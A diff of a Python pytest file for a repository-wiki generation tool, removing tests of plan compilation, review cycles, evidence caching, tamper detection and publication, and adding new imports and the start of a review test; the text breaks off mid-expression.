@@ -1,1650 +1,701 @@
-import hashlib
+"""Review, stamp, index, verify, pointer, impact, update and status."""
+
 import json
-import os
-import pathlib
-import subprocess
-from datetime import datetime
 
-import _db
-import _publish
-import _state
-import _validate
-import _workspace
 import pytest
-from _files import compact_json_size, directory_digest
-from _frontmatter import parse_file, render
-from _markdown import extract
-from _models import RunPolicy
+
+import _impact
+import _page
+import _review
+import _stamp
+import _status
+import _validate
+from helpers import commit
+from kit import ARCH, BILLING, approve, complete, set_body
 
 
-def write(path: pathlib.Path, text: str) -> None:
-    path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(text, encoding="utf-8", newline="\n")
-
-
-def workspace(
-    tmp_path: pathlib.Path, language: str = "en", policy: dict | None = None
-) -> pathlib.Path:
-    root = tmp_path / "workspace"
-    source = root / "source"
-    source.mkdir(parents=True)
-    subprocess.run(["git", "init", "-q", str(source)], check=True)
-    subprocess.run(
-        ["git", "-C", str(source), "config", "user.email", "qa@example.test"],
-        check=True,
-    )
-    subprocess.run(["git", "-C", str(source), "config", "user.name", "QA"], check=True)
-    write(source / "app.py", "def answer():\n    return 42\n")
-    write(source / "architecture.py", "class Service:\n    pass\n")
-    subprocess.run(["git", "-C", str(source), "add", "-A"], check=True)
-    subprocess.run(["git", "-C", str(source), "commit", "-qm", "initial"], check=True)
-    _workspace.init(root, language, 30, policy)
-    _workspace.add_git_link(root, str(source), "src")
-    return root
-
-
-def start(root: pathlib.Path) -> pathlib.Path:
-    result = _state.start_run(root)
-    assert result["contract"] == "single-author-plan-evidence-registry"
-    assert result["language"] in ("en", "zh")
-    assert result["sources"] == ["src"]
-    assert result["phase"] == "plan"
-    run = _state.run_dir(root, _state.read(root)["run_id"])
-    assert "repo-wiki-progress:initial" in (run / "work/progress.md").read_text(
-        encoding="utf-8"
-    )
-    return run
-
-
-def unit(
-    unit_id: str, source_path: str, kind: str, concept_id: str | None = None
-) -> dict:
-    return {
-        "id": unit_id,
-        "kind": kind,
-        "question": f"How does {unit_id} work?",
-        "domain_ids": ["answers"],
-        "concept_ids": [concept_id or unit_id],
-        "participants": [
-            {
-                "source": "src",
-                "roles": ["owner"],
-                "paths": [source_path],
-                "evidence": [f"src/{source_path}#L1-L2"],
-            }
-        ],
-    }
-
-
-def plan_meta(units: list[dict] | None = None) -> dict:
-    units = units or [
-        unit("answer", "app.py", "flow"),
-        unit("architecture", "architecture.py", "capability"),
+def test_review_subject_binds_draft_bytes(tmp_path):
+    root, ws = complete(tmp_path)
+    first = _review.subject(ws, _page.load_pages(ws))
+    assert [p["path"] for p in first["pages"]] == [
+        "architecture.md", "conventions.md", "glossary.md", "modules/billing.md",
     ]
-    concept_units = {}
-    for item in units:
-        for concept_id in item["concept_ids"]:
-            concept_units.setdefault(concept_id, item)
-    concepts = []
-    for concept_id, owner in concept_units.items():
-        concepts.append(
-            {
-                "id": concept_id,
-                "domain_id": "answers",
-                "kind": "service" if concept_id == "architecture" else "entity",
-                "name": concept_id.replace("-", " ").title(),
-                "definition": f"The {concept_id} concept owned by the answers domain.",
-                "owner_unit_id": owner["id"],
-                "model_basis": {"basis": "none"},
-            }
-        )
-    return {
-        "kind": "knowledge-plan-intent",
-        "analysis": analysis(),
-        "source_areas": [
-            {
-                "id": "src.answers",
-                "source": "src",
-                "paths": ["."],
-                "disposition": "domain",
-                "domain_ids": ["answers"],
-            }
-        ],
-        "domains": [
-            {
-                "id": "answers",
-                "name": "Answers",
-                "definition": "Owns answer behavior and its service boundary.",
-                "owner_capability": next(
-                    item["id"] for item in units if item["kind"] == "capability"
-                ),
-            }
-        ],
-        "concepts": concepts,
-        "catalog_groups": [],
-        "relationships": [],
-        "units": units,
-        "gaps": [],
-    }
-
-
-def analysis(language: str = "en") -> dict:
-    return {
-        "global_model": "Answers Domain 负责答案行为。"
-        if language == "zh"
-        else "The Answers Domain owns answer behavior.",
-        "lifecycles": "答案由入口创建；没有跨源交接。"
-        if language == "zh"
-        else "The entry creates answers; this fixture has no cross-source handoff.",
-        "conclusions": [
-            {
-                "claim": "冻结入口定义该能力。"
-                if language == "zh"
-                else "The frozen entry point defines the capability.",
-                "evidence": ["src/app.py#L1-L2"],
-            }
-        ],
-    }
-
-
-def write_plan(
-    run: pathlib.Path,
-    value: dict | None = None,
-    *,
-    language: str = "en",
-    extra: str = "",
-) -> None:
-    work = run / "work"
-    value = value or plan_meta()
-    if language == "zh":
-        value["analysis"] = analysis(language)
-    value["analysis"]["global_model"] += extra
-    write(work / "plan-intent.json", json.dumps(value))
-    (work / "plan-ledger.json").unlink(missing_ok=True)
-    _state.plan_compile(run.parents[2])
-
-
-def test_code_model_unit_is_derived_from_structure_evidence(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta([unit("answer", "app.py", "capability", "answer")])
-    concept = value["concepts"][0]
-    concept["model_basis"] = {
-        "basis": "code",
-        "structure_evidence": ["src/app.py#L1-L2"],
-    }
-    path = run / "work/plan.md"
-    write_plan(run, value)
-
-    parsed, issues = _validate.validate_plan_artifact(root, _state.read(root), path)
-
-    assert not issues
-    model = parsed.effective_units[-1]
-    assert model.id == "model.answer"
-    assert model.scopes[0].paths == ["app.py"]
-
-
-def test_each_domain_requires_a_dedicated_owner_unit(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta()
-    owner = next(
-        item
-        for item in value["units"]
-        if item["id"] == value["domains"][0]["owner_capability"]
-    )
-    value["source_areas"][0]["domain_ids"].append("audit")
-    owner["domain_ids"].append("audit")
-    value["domains"].append(
-        {
-            "id": "audit",
-            "name": "Audit",
-            "definition": "Owns an independent audit responsibility.",
-            "owner_capability": owner["id"],
-        }
-    )
-    path = run / "work/plan.md"
-    write_plan(run, value)
-
-    _plan, issues = _validate.validate_plan_artifact(root, _state.read(root), path)
-
-    assert "domain-owner-unit-shared" in {issue.code for issue in issues}
-
-
-def composition() -> str:
-    return render(
-        {
-            "kind": "composition-map",
-            "reference_roots": [],
-            "pages": [
-                {
-                    "id": "answer",
-                    "path": "guides/answer.md",
-                    "type": "Domain",
-                    "title": "Answer behavior",
-                    "description": "Open before changing answer behavior.",
-                    "tags": ["answer"],
-                    "units": ["answer"],
-                    "diagrams": [],
-                },
-                {
-                    "id": "architecture",
-                    "path": "system/service-boundary.md",
-                    "type": "Domain",
-                    "title": "Service boundary",
-                    "description": "Open before changing service boundaries.",
-                    "tags": ["architecture"],
-                    "units": ["architecture"],
-                    "diagrams": [],
-                },
-            ],
-            "gaps": [],
-        },
-        "# Composition\n\nPaths provide the final information hierarchy.\n",
-    )
-
-
-def draft(resource: str, related_id: str, related_title: str) -> str:
-    evidence_id = f"ev-{hashlib.sha256(resource.encode()).hexdigest()[:16]}"
-    return render(
-        {"coverage": "full"},
-        "## Purpose and system context\n\n"
-        f"This fixture owns one bounded system responsibility.[^{evidence_id}]\n\n"
-        "## Responsibility and public surface\n\n"
-        f"The captured entry point defines this responsibility.[^{evidence_id}]\n\n"
-        "## Invariants and rules\n\n"
-        "| Rule | Enforcement point | Observable failure |\n"
-        "| --- | --- | --- |\n"
-        "| The entry point remains authoritative. | Captured function | Call failure |\n\n"
-        "## Data model overview\n\nNo persistent model exists for this fixture.\n\n"
-        "## State and lifecycle\n\nThe answer has no persisted state lifecycle.\n\n"
-        f"## Key flows\n\nThe entry point produces the answer directly.[^{evidence_id}]\n\n"
-        f"## Concepts\n\nSee [{related_title}][{related_id}].\n\n"
-        f"## Change points\n\nChange the captured entry point and its tests.[^{evidence_id}]\n",
-    )
-
-
-def merge_probes(path: pathlib.Path, field: str) -> list[dict]:
-    data = (
-        json.loads(path.read_text(encoding="utf-8"))
-        if path.suffix == ".json"
-        else parse_file(path).meta
-    )
-    ids = [item["id"] for item in data[field]]
-    if len(ids) < 2:
-        return []
-    return [
-        {
-            f"{field[:-1]}_ids": [ids[index], ids[index + 1]],
-            "decision": "keep-separate",
-            "rationale": "The neighboring records have independent change surfaces.",
-        }
-        for index in range(len(ids) - 1)
-    ]
-
-
-def write_work(run: pathlib.Path) -> None:
-    write_plan(run)
-    write(run / "work/progress.md", "# Progress\n\nPlan complete; pages remain.\n")
-    write(run / "work/composition.md", composition())
-    write(
-        run / "work/drafts/answer.md",
-        draft("src/app.py#L1-L2", "architecture", "service boundary"),
-    )
-    write(
-        run / "work/drafts/architecture.md",
-        draft("src/architecture.py#L1-L2", "answer", "answer behavior"),
-    )
-
-
-def review(path: pathlib.Path, digest: str, verdict: str) -> None:
-    issues = (
-        [
-            {**item, "status": "resolved"}
-            for item in json.loads(path.read_text(encoding="utf-8")).get("issues", [])
-        ]
-        if path.is_file() and verdict == "approved"
-        else []
-    )
-    if verdict == "changes_requested":
-        issues = [
-            {
-                "id": "coverage.answer-failure",
-                "status": "open",
-                "category": "coverage",
-                "claim": "The answer page omits its failure behavior.",
-                "resolution": "Add the failure behavior with evidence.",
-                "area": "page",
-                "page_ids": ["answer"],
-                "operation": "repair",
-            }
-        ]
-    write(
-        path,
-        json.dumps({"subject_digest": digest, "verdict": verdict, "issues": issues}),
-    )
-
-
-def plan_review(path: pathlib.Path, digest: str, verdict: str) -> None:
-    issues = (
-        [
-            {**item, "status": "resolved"}
-            for item in json.loads(path.read_text(encoding="utf-8")).get("issues", [])
-        ]
-        if path.is_file() and verdict == "approved"
-        else []
-    )
-    if verdict == "changes_requested":
-        issues = [
-            {
-                "id": "domain.visible-subsystem",
-                "status": "open",
-                "category": "domain-coverage",
-                "claim": "A visible subsystem is absent from units and gaps.",
-                "resolution": "Account for it in a unit or evidence-backed gap.",
-            }
-        ]
-    write(
-        path,
-        json.dumps(
-            {
-                "subject_digest": digest,
-                "verdict": verdict,
-                "merge_probes": merge_probes(
-                    path.with_name("plan-ledger.json"), "units"
-                ),
-                "issues": issues,
-            }
-        ),
-    )
-
-
-def composition_review(path: pathlib.Path, digest: str, verdict: str) -> None:
-    issues = (
-        [
-            {**item, "status": "resolved"}
-            for item in json.loads(path.read_text(encoding="utf-8")).get("issues", [])
-        ]
-        if path.is_file() and verdict == "approved"
-        else []
-    )
-    if verdict == "changes_requested":
-        issues = [
-            {
-                "id": "routing.shared-route",
-                "status": "open",
-                "category": "routing",
-                "claim": "Two independently maintained units share one route.",
-                "resolution": "Split the change surfaces or explain the causal merge.",
-                "area": "composition",
-                "page_ids": ["answer"],
-                "operation": "split",
-            }
-        ]
-    write(
-        path,
-        json.dumps(
-            {
-                "subject_digest": digest,
-                "verdict": verdict,
-                "merge_probes": merge_probes(path.with_name("composition.md"), "pages"),
-                "issues": issues,
-            }
-        ),
-    )
-
-
-def approve_plan(root: pathlib.Path, run: pathlib.Path) -> None:
-    progress = run / "work/progress.md"
-    if "repo-wiki-progress:initial" in progress.read_text(encoding="utf-8"):
-        write(progress, "# Progress\n\nPlan complete; review is next.\n")
-    packet = _state.plan_review_prepare(root)
-    assert packet["ok"]
-    plan_review(run / "work/plan-review.json", packet["subject_digest"], "approved")
-
-
-def approve_composition(root: pathlib.Path, run: pathlib.Path) -> None:
-    prepared = _state.composition_prepare(root)
-    assert prepared["ok"]
-    packet = _state.composition_review_prepare(root)
-    assert packet["ok"]
-    composition_review(
-        run / "work/composition-review.json", packet["subject_digest"], "approved"
-    )
-    for page_id in (
-        item["id"] for item in parse_file(run / "work/composition.md").meta["pages"]
-    ):
-        assert _state.page_prepare(root, page_id)["ok"]
-
-
-def test_artifact_loop_reaches_publication_and_rechecks_changes(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    assert (run / "index/src.md").is_file()
-
-    search = _state.evidence_search(root, "src", "return 42")
-    assert search["items"][0]["locator"] == "src/app.py#L2"
-    assert "return 42" in _state.evidence_read(root, "src/app.py#L1-L2")["text"]
-
-    write_work(run)
-    assert _state.status(root)["next_actions"] == ["review plan"]
-    plan_packet = _state.plan_review_prepare(root)
-    plan_review(
-        run / "work/plan-review.json",
-        plan_packet["subject_digest"],
-        "changes_requested",
-    )
-    assert _state.status(root)["phase"] == "plan"
-    value = json.loads((run / "work/plan-intent.json").read_text())
-    value["analysis"]["global_model"] += (
-        "\nThe missing subsystem is now accounted for.\n"
-    )
-    write_plan(run, value)
-    repaired_plan_packet = _state.plan_review_prepare(root)
-    assert repaired_plan_packet["subject_digest"] != plan_packet["subject_digest"]
-    assert repaired_plan_packet["previous_review"]["issues"][0]["id"] == (
-        "domain.visible-subsystem"
-    )
-    plan_review(
-        run / "work/plan-review.json",
-        repaired_plan_packet["subject_digest"],
-        "approved",
-    )
-    assert _state.status(root)["next_actions"] == ["composition prepare"]
-    assert _state.composition_prepare(root)["ok"]
-    assert _state.status(root)["next_actions"] == ["review composition"]
-    composition_packet = _state.composition_review_prepare(root)
-    composition_review(
-        run / "work/composition-review.json",
-        composition_packet["subject_digest"],
-        "changes_requested",
-    )
-    assert _state.status(root)["phase"] == "composition"
-    composition_path = run / "work/composition.md"
-    write(
-        composition_path,
-        composition_path.read_text(encoding="utf-8")
-        + "\nEach page now has an explicit maintainer route.\n",
-    )
-    repaired_composition_packet = _state.composition_review_prepare(root)
-    assert (
-        repaired_composition_packet["subject_digest"]
-        != composition_packet["subject_digest"]
-    )
-    assert repaired_composition_packet["previous_review"]["issues"][0]["id"] == (
-        "routing.shared-route"
-    )
-    composition_review(
-        run / "work/composition-review.json",
-        repaired_composition_packet["subject_digest"],
-        "approved",
-    )
-    assert _state.page_prepare(root, "answer")["ok"]
-    assert _state.page_prepare(root, "architecture")["ok"]
-    assert _state.status(root)["next_actions"] == ["review prepare"]
-    packet = _state.review_prepare(root)
-    assert packet["ok"]
-    bound_answer = parse_file(run / "candidate/guides/answer.md")
-    assert "](/system/service-boundary.md)" in bound_answer.body
-    assert bound_answer.meta["sources"][0]["id"].startswith("ev-")
-    assert set(extract(bound_answer.body).footnote_defs) == {
-        bound_answer.meta["sources"][0]["id"]
-    }
-    assert parse_file(run / "work/drafts/answer.md").meta == {"coverage": "full"}
-    assert (run / "candidate/index.md").is_file()
-    assert (run / "candidate/guides/index.md").is_file()
-
-    review(run / "work/review.json", packet["subject_digest"], "changes_requested")
-    result = _state.review_complete(root)
-    assert result["verdict"] == "changes_requested"
-    assert result["state"]["phase"] == "repair"
-    answer = run / "work/drafts/answer.md"
-    write(
-        answer,
-        answer.read_text(encoding="utf-8")
-        + f"\nFailure behavior is explicit.[^ev-{hashlib.sha256('src/app.py#L1-L2'.encode()).hexdigest()[:16]}]\n",
-    )
-    assert _state.status(root)["next_actions"] == ["review prepare"]
-    second = _state.review_prepare(root)
-    assert second["subject_digest"] != packet["subject_digest"]
-    assert second["previous_review"]["issues"][0]["id"] == ("coverage.answer-failure")
-    assert second["previous_review"]["artifact"] == str(run / "work/review.json")
-    review(run / "work/review.json", second["subject_digest"], "approved")
-    completed = _state.review_complete(root)
-    assert completed["state"]["status"] == "approved"
-
-    plan_path = run / "work/plan.md"
-    approved_plan = plan_path.read_text(encoding="utf-8")
-    write(plan_path, approved_plan + "\nTampered after approval.\n")
-    with pytest.raises(_publish.PublishError, match="working artifacts changed"):
-        _publish.publish(root)
-    write(plan_path, approved_plan)
-
-    published = _publish.publish(root)
-    assert published["pages"] == 2
-    manifest = json.loads(
-        (pathlib.Path(published["path"]) / ".okf-manifest.json").read_text(
-            encoding="utf-8"
-        )
-    )
-    assert len(manifest["nav"]) == 2
-    assert all(page["origin"] == "authored" for page in manifest["pages"].values())
-    assert all(page["inputs"] for page in manifest["pages"].values())
-    assert _state.status(root)["status"] == "published"
-    errors = [
-        item
-        for item in _validate.validate_publication(
-            root, pathlib.Path(published["path"])
-        ).issues
-        if item.severity == "error"
-    ]
-    assert errors == []
-
-    proposal = _state.propose_start(root)
-    assert proposal["reference"].endswith("references/propose.md")
-    assert _state.propose_complete(root) == {"ok": True, "files": []}
-
-    verified = _publish.verify(root, "human:qa", ["guides/answer.md"])
-    assert verified["actor"] == "human:qa"
-    assert verified["generation"] != published["generation"]
-    assert _publish.rollback(root)["generation"] == published["generation"]
-
-
-def test_plan_without_domain_concept_ledger_is_rejected(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write(run / "work/plan.md", "# Legacy authored Plan\n")
-    write(run / "work/plan-ledger.json", json.dumps({"kind": "knowledge-plan"}))
-    write(run / "work/progress.md", "# Progress\n\nPlan attempted.\n")
-
-    status = _state.status(root)
-
-    assert status["phase"] == "plan"
-    assert {item["code"] for item in status["issues"]} == {
-        "plan-intent-missing",
-        "schema-invalid",
-    }
-
-
-def test_status_derives_plan_composition_and_draft_repairs(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_plan(run)
-    assert _state.status(root)["issues"][0]["code"] == "progress-stale"
-    write(run / "work/progress.md", "# Progress\n\nPlan complete; review is next.\n")
-    assert _state.status(root)["issues"][0]["code"] == "plan-review-missing"
-    approve_plan(root, run)
-    assert _state.status(root)["issues"][0]["code"] == "composition-prepare-required"
-    assert _state.composition_prepare(root)["ok"]
-    assert _state.status(root)["issues"][0]["code"] == "composition-missing"
-    write(run / "work/composition.md", composition())
-    status = _state.status(root)
-    assert status["phase"] == "composition-review"
-    assert status["issues"][0]["code"] == "composition-review-missing"
-    packet = _state.composition_review_prepare(root)
-    write(
-        run / "work/composition-review.json",
-        json.dumps(
-            {
-                "subject_digest": packet["subject_digest"],
-                "verdict": "changes_requested",
-                "merge_probes": merge_probes(run / "work/composition.md", "pages"),
-                "issues": [
-                    {
-                        "id": "routing.invalid-area",
-                        "status": "open",
-                        "category": "routing",
-                        "claim": "The route is ambiguous.",
-                        "resolution": "Repair the Composition route.",
-                        "area": "page",
-                        "page_ids": ["answer"],
-                        "operation": "repair",
-                    }
-                ],
-            }
-        ),
-    )
-    assert _state.status(root)["issues"][0]["code"] == (
-        "composition-review-area-invalid"
-    )
-    approve_composition(root, run)
-    status = _state.status(root)
-    assert status["phase"] == "write"
-    assert {item["code"] for item in status["issues"]} == {"page-draft-missing"}
-    assert {item["phase"] for item in status["issues"]} == {"write"}
-    assert {item["applicability"] for item in status["issues"]} == {"blocking"}
-    assert {item["next_action"] for item in status["issues"]} == {"repair work/drafts"}
-    assert status["artifact_counts"] == {
-        "knowledge_units": 2,
-        "pages": 2,
-        "authored_pages": 2,
-        "reference_pages": 0,
-        "drafts_written": 0,
-        "drafts_missing": 2,
-    }
-
-
-def test_page_prepare_derives_one_bounded_domain_packet(tmp_path, monkeypatch):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_work(run)
-    approve_plan(root, run)
-    approve_composition(root, run)
-
-    def unexpected_read(*_args, **_kwargs):
-        raise AssertionError("valid prepared evidence must be reused")
-
-    monkeypatch.setattr(_state, "_evidence_cache_payload", unexpected_read)
-
-    result = _state.page_prepare(root, "answer")
-    packet = json.loads(pathlib.Path(result["artifact"]).read_text(encoding="utf-8"))
-
-    assert result["ok"] is True
-    assert packet["page"]["id"] == "answer"
-    assert [item["id"] for item in packet["units"]] == ["answer"]
-    assert [item["id"] for item in packet["projections"]] == ["architecture"]
-    assert [item["id"] for item in packet["domains"]] == ["answers"]
-    assert {item["id"] for item in packet["concepts"]} == {
-        "answer",
-        "architecture",
-    }
-    assert [item["id"] for item in packet["related_pages"]] == ["architecture"]
-    assert [item["seed"] for item in packet["evidence"]] == [
-        "src/app.py#L1-L2",
-        "src/architecture.py#L1-L2",
-    ]
-    assert all(item["id"].startswith("ev-") for item in packet["evidence"])
-    assert all(
-        pathlib.Path(item["cache_path"]).is_file() for item in packet["evidence"]
-    )
-    assert packet["draft_frontmatter"] == {"coverage": "full"}
-    assert packet["template"].endswith("assets/templates/en/domain.md")
-    assert packet["output"].endswith("work/drafts/answer.md")
-    assert "plan" not in packet
-    assert "composition" not in packet
-
-    invalid = _state.page_prepare(root, "missing")
-    assert invalid["ok"] is False
-    assert invalid["issues"][0]["code"] == "page-id-invalid"
-
-
-def test_page_packet_cache_tampering_is_rejected(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_work(run)
-    approve_plan(root, run)
-    approve_composition(root, run)
-    packet = json.loads((run / "work/page-packets/answer.json").read_text())
-    cache = pathlib.Path(packet["evidence"][0]["cache_path"])
-    value = json.loads(cache.read_text())
-    value["content"]["text"] = "tampered"
-    write(cache, json.dumps(value))
-
-    assert "page-evidence-cache-invalid" in {
-        item["code"] for item in _state.status(root)["issues"]
-    }
-    assert "page prepare answer" in _state.status(root)["next_actions"]
-
-
-@pytest.mark.parametrize("source_kind", ["git", "files"])
-def test_source_areas_reject_uncovered_frozen_files(tmp_path, source_kind):
-    if source_kind == "git":
-        root = workspace(tmp_path)
-    else:
-        root = tmp_path / "workspace"
-        root.mkdir()
-        write(tmp_path / "files/app.py", "answer = 42\n")
-        write(tmp_path / "files/architecture.py", "class Service: pass\n")
-        _workspace.init(root)
-        _workspace.add_files_source(root, str(tmp_path / "files"), "src")
-    run = start(root)
-    value = plan_meta()
-    value["source_areas"][0]["paths"] = ["app.py"]
-    write_plan(run, value)
-
-    result = _state.plan_inspect(root)
-
-    assert not result["ok"]
-    assert "source-area-uncovered" in {item["code"] for item in result["diagnostics"]}
-    assert "architecture.py" in json.dumps(result["diagnostics"])
-
-
-def test_prepared_evidence_reads_complete_ranges_and_long_lines(tmp_path):
-    root = workspace(tmp_path)
-    source = root / "source"
-    write(source / "long.txt", "".join(f"row {i}\n" for i in range(1, 1201)))
-    write(source / "wide.sql", "SELECT " + "x" * 600 + " FROM orders;\n")
-    subprocess.run(["git", "-C", str(source), "add", "-A"], check=True)
-    subprocess.run(["git", "-C", str(source), "commit", "-qm", "evidence"], check=True)
-    start(root)
-    state = _state.read(root)
-
-    for locator in ("src/long.txt", "src/long.txt#L1-L1200"):
-        cache = _state._evidence_cache_payload(root, state, locator)
-        assert cache["resource"] == "src/long.txt#L1-L1200"
-        assert "1200|row 1200" in cache["content"]["text"]
-        assert not cache["content"]["limit_reached"]
-    cache = _state._evidence_cache_payload(root, state, "src/long.txt#L201-L1100")
-    assert cache["resource"] == "src/long.txt#L201-L1100"
-    assert "1101|" not in cache["content"]["text"]
-    assert "FROM orders;" in _state.evidence_read(root, "src/wide.sql")["text"]
-
-
-def test_page_packet_routes_cross_domain_owners_and_gaps(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta()
-    value["units"][0]["kind"] = "capability"
-    value["units"][1]["domain_ids"] = ["infrastructure"]
-    value["concepts"][1]["domain_id"] = "infrastructure"
-    value["domains"][0]["owner_capability"] = "answer"
-    value["domains"].append(
-        {
-            "id": "infrastructure",
-            "name": "Infrastructure",
-            "definition": "Owns service infrastructure.",
-            "owner_capability": "architecture",
-        }
-    )
-    value["source_areas"][0]["domain_ids"].append("infrastructure")
-    value["relationships"] = [
-        {
-            "id": "answer-service",
-            "from_concept_id": "answer",
-            "to_concept_id": "architecture",
-            "level": "observed",
-            "cardinality": "many-to-one",
-            "evidence": ["src/app.py#L1-L2"],
-            "include_in_er": False,
-        }
-    ]
-    value["gaps"] = [
-        {
-            "id": "missing-recovery",
-            "category": "source-coverage",
-            "claim": "Recovery belongs to an unregistered source.",
-            "evidence": [],
-            "unit_ids": ["answer"],
-        }
-    ]
-    write_plan(run, value)
-    assert "`missing-recovery`" in (run / "work/plan.md").read_text()
-    write(run / "work/composition.md", composition())
-    approve_plan(root, run)
-    approve_composition(root, run)
-    packet = json.loads((run / "work/page-packets/answer.json").read_text())
-    other = json.loads((run / "work/page-packets/architecture.json").read_text())
-
-    assert [p["id"] for p in packet["related_pages"]] == ["architecture"]
-    assert [gap["id"] for gap in packet["gaps"]] == ["missing-recovery"]
-    assert packet["draft_frontmatter"] == {"coverage": "partial"}
-    assert other["gaps"] == []
-    write(
-        run / "work/drafts/answer.md",
-        draft("src/app.py#L1-L2", "architecture", "service"),
-    )
-    assert "page-gap-coverage-missing" in {
-        item["code"] for item in _state.status(root)["issues"]
-    }
-    value["gaps"][0].pop("unit_ids")
-    write_plan(
-        run,
-        value,
-        extra="\nmissing-recovery: recovery is outside registered Sources.\n",
-    )
-    approve_plan(root, run)
-    approve_composition(root, run)
-    other = json.loads((run / "work/page-packets/architecture.json").read_text())
-    assert other["draft_frontmatter"] == {"coverage": "partial"}
-    assert [gap["id"] for gap in other["gaps"]] == ["missing-recovery"]
-
-
-def test_page_packet_survives_unrelated_plan_analysis_edit(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_work(run)
-    approve_plan(root, run)
-    approve_composition(root, run)
-    packet_path = run / "work/page-packets/answer.json"
-    before = packet_path.read_bytes()
-    value = json.loads((run / "work/plan-intent.json").read_text())
-    value["analysis"]["global_model"] += "\nEditorial clarification.\n"
-    write_plan(run, value)
-    approve_plan(root, run)
-    _state.composition_prepare(root)
-    packet = _state.composition_review_prepare(root)
-    composition_review(
-        run / "work/composition-review.json", packet["subject_digest"], "approved"
-    )
-
-    assert _state.status(root)["phase"] == "review"
-    assert packet_path.read_bytes() == before
-
-    value = json.loads((run / "work/plan-intent.json").read_text())
-    value["units"][0]["question"] = "Where does answer recovery begin?"
-    write_plan(run, value)
-    approve_plan(root, run)
-    _state.composition_prepare(root)
-    packet = _state.composition_review_prepare(root)
-    composition_review(
-        run / "work/composition-review.json", packet["subject_digest"], "approved"
-    )
-    assert "page-packet-stale" in {
-        item["code"] for item in _state.status(root)["issues"]
-    }
-
-
-def test_prepared_evidence_and_page_inputs_enforce_byte_budgets(tmp_path, monkeypatch):
-    policy = RunPolicy.defaults().model_dump(mode="json")
-    policy["evidence"]["read"]["max_output_bytes"] = 4096
-    root = workspace(tmp_path, policy=policy)
-    source = root / "source"
-    write(source / "large.txt", "".join("x" * 100 + "\n" for _ in range(100)))
-    subprocess.run(["git", "-C", str(source), "add", "-A"], check=True)
-    subprocess.run(
-        ["git", "-C", str(source), "commit", "-qm", "budget fixture"], check=True
-    )
-    run = start(root)
-    with pytest.raises(_state.StateError, match="narrow the Plan seed range"):
-        _state._evidence_cache_payload(root, _state.read(root), "src/large.txt")
-    write_work(run)
-    approve_plan(root, run)
-    approve_composition(root, run)
-    monkeypatch.setattr(_validate, "MAX_PAGE_INPUT_BYTES", 100)
-    result = _state.page_prepare(root, "answer")
-    assert not result["ok"]
-    assert result["issues"][0]["code"] == "page-input-budget-exceeded"
-
-
-def test_draft_can_only_cite_prepared_evidence_ids(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_work(run)
-    approve_plan(root, run)
-    approve_composition(root, run)
-    path = run / "work/drafts/answer.md"
-    write(path, path.read_text().replace("[^ev-", "[^ev-unknown-", 1))
-
-    assert "draft-evidence-id-invalid" in {
-        item["code"] for item in _state.status(root)["issues"]
-    }
-
-
-def test_plan_analysis_checks_run_despite_semantic_schema_errors(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta()
-    value["domains"][0]["owner_capability"] = []
-    value["analysis"]["conclusions"][0]["evidence"] = ["src/missing.py#L1"]
-    write(run / "work/plan-intent.json", json.dumps(value))
-    result = _state.plan_inspect(root)
-    assert {item["code"] for item in result["diagnostics"]} >= {
-        "schema-invalid",
-        "evidence-unresolved",
-    }
-    assert "analysis-validation" in result["checks_ran"]
-    assert "semantic-compilation" in result["skipped_checks"]
-    assert (
-        next(
-            item
-            for item in result["diagnostics"]
-            if item["code"] == "evidence-unresolved"
-        )["pointer"]
-        == "/analysis/conclusions/0/evidence/0"
-    )
-
-
-def test_semantic_checks_run_despite_analysis_schema_errors(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta()
-    value["analysis"]["conclusions"] = []
-    value["domains"][0]["owner_capability"] = "missing"
-    write(run / "work/plan-intent.json", json.dumps(value))
-    result = _state.plan_inspect(root)
-    assert {d["code"] for d in result["diagnostics"]} >= {
-        "schema-invalid",
-        "domain-owner-invalid",
-    }
-    assert "semantic-compilation" in result["checks_ran"]
-    assert "analysis-validation" in result["skipped_checks"]
-
-
-def test_replica_schema_errors_do_not_hide_participant_evidence_errors(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta()
-    value["table_replicas"] = [
-        {
-            "table": {"source": "database", "table": "orders"},
-            "replica_of": "database/original",
-            "evidence": ["src/app.py#L1"],
-        }
-    ]
-    value["units"][0]["participants"][0]["evidence"] = ["src/missing.py#L1"]
-    write(run / "work/plan-intent.json", json.dumps(value))
-    result = _state.plan_inspect(root)
-    assert {d["code"] for d in result["diagnostics"]} >= {
-        "schema-invalid",
-        "evidence-unresolved",
-    }
-    assert "intent-environment.units" in result["checks_ran"]
-    assert "intent-environment.table_replicas" in result["skipped_checks"]
-    assert (
-        next(d for d in result["diagnostics"] if d["code"] == "evidence-unresolved")[
-            "pointer"
-        ]
-        == "/units/0/participants/0/evidence/0"
-    )
-
-
-@pytest.mark.parametrize("language", ["en", "zh"])
-def test_plan_compilation_generates_and_binds_narrative_and_ledger(tmp_path, language):
-    root = workspace(tmp_path, language)
-    run = start(root)
-    value = plan_meta()
-    value["analysis"] = analysis(language)
-    value["gaps"] = [
-        {
-            "id": "external-recovery",
-            "category": "source-coverage",
-            "claim": "Recovery is outside registered Sources.",
-            "evidence": ["src/app.py#L1-L2"],
-        }
-    ]
-    work = run / "work"
-    write(work / "plan-intent.json", json.dumps(value))
-    assert _state.plan_inspect(root)["ok"]
-    assert not (work / "plan.md").exists()
-    assert _state.plan_compile(root)["ok"]
-    before = {
-        name: (work / name).read_bytes() for name in ("plan.md", "plan-ledger.json")
-    }
-    parsed = parse_file(work / "plan.md")
-    assert "`external-recovery`" in parsed.body
-    structure = extract(parsed.body)
-    assert len(structure.footnote_defs) == 1
-    assert {ref for ref, _ in structure.footnote_refs} == set(structure.footnote_defs)
-    assert (
-        "未解决的缺口" in parsed.body
-        if language == "zh"
